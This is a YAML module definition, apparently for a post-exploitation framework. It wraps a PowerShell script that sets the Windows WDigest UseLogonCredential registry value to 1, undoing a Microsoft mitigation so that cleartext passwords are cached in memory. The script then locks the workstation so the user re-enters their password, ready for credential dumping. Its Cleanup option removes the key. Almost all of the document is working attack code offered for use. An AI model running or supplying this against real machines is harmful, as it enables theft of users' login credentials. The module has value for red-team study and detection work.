name: Invoke-WdigestDowngrade
authors:
  - name: Will Schroeder
    handle: '@harmj0y'
    link: https://twitter.com/harmj0y
description: Sets wdigest on the machine to explicitly use logon credentials. Counters kb2871997.
software: ''
tactics: []
techniques:
  - T1214
background: false
output_extension:
needs_admin: true
opsec_safe: false
language: powershell
min_language_version: '2'
comments:
  - https://www.trustedsec.com/april-2015/dumping-wdigest-creds-with-meterpreter-mimikatzkiwi-in-windows-8-1/
options:
  - name: Agent
    description: Agent to run module on.
    required: true
    value: ''
  - name: NoLock
    description: Don't lock the workstation after registry change.
    required: false
    value: 'False'
    strict: true
    suggested_values:
      - True
      - False
  - name: Cleanup
    description: Switch. Disable the registry key.
    required: false
    value: 'False'
    strict: true
    suggested_values:
      - True
      - False
script: |
  function Invoke-LockWorkStation {
      # region define P/Invoke types dynamically
      #   stolen from PowerSploit https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1
      #   thanks matt and chris :)
      $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')
      $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
      $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)

      $TypeBuilder = $ModuleBuilder.DefineType('Win32.User32', 'Public, Class')
      $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
      $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
      $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,
          @('User32.dll'),
          [Reflection.FieldInfo[]]@($SetLastError),
          @($True))

      # Define [Win32.User32]::LockWorkStation()
      $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('LockWorkStation',
          'User32.dll',
          ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
          [Reflection.CallingConventions]::Standard,
          [Bool],
          [Type[]]@(),
          [Runtime.InteropServices.CallingConvention]::Winapi,
          [Runtime.InteropServices.CharSet]::Ansi)
      $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

      $User32 = $TypeBuilder.CreateType()

      $Null = $User32::LockWorkStation()
  }

  function Invoke-WdigestDowngrade {
      <#
      .SYNOPSIS
      Explicitly sets Wdigest on a Windows 8.1/Server 2012 machine to use logon credentials.
      Locks the screen after so the user must retype their password.

      .PARAMETER NoLock
      Doesn't lock the screen after registry set.

      .PARAMETER Cleanup
      Removes the registry key to force UseLogonCredential.

      .LINK
      https://www.trustedsec.com/april-2015/dumping-wdigest-creds-with-meterpreter-mimikatzkiwi-in-windows-8-1/

      #>
      [CmdletBinding()]
      Param (
          [Switch] $NoLock,
          [Switch] $Cleanup
      )

      if($Cleanup){
          try {
              Remove-ItemProperty -Force -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest" -Name "UseLogonCredential" -ErrorAction Stop
              "Wdigest set to not use logoncredential."
          }
          catch {
              "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential not set"
          }
      }
      else{
          Set-ItemProperty -Force -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value "1"
          "Wdigest set to use logoncredential."

          if(-not $NoLock){
              Invoke-LockWorkStation
              "Workstation locked"
          }
      }
  }
script_end: Invoke-WdigestDowngrade {{ PARAMS }}
